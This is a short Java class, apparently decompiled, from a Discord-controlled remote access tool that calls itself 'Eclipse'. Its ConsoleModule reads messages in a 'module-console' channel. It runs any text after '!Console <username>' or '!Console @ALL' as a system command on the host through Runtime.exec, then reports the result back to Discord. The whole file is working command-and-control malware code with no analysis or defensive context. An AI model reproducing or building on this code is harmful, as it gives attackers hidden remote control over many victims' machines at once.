package me.Eclipse.Modules.Impl;

import java.awt.Color;
import java.io.IOException;

import me.Eclipse.Brain;
import me.Eclipse.Utils.Helper;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;

public class ConsoleModule {
    public static void run(MessageReceivedEvent var0) {
        Message var1 = var0.getMessage();
        if (var1.getChannel().getName().contains("module-console")) {
            if (var1.getContentDisplay().startsWith("!Console " + Brain.Username) || var1.getContentDisplay().startsWith("!Console @ALL")) {
                String var2 = var1.getContentDisplay().replaceFirst("!Console " + Brain.Username + " ", "").replaceFirst("!Console @ALL ", "");

                try {
                    Runtime.getRuntime().exec(var2);
                    Helper.sendMessage(Color.GREEN, "Module Console (" + Brain.Username + ")", "The command has been successfully runned.", var0);
                } catch (IOException var4) {
                    Helper.sendMessage(Color.RED, "Module Console (" + Brain.Username + ")", "Could not run this command.", var0);
                }
            }

        }
    }
}
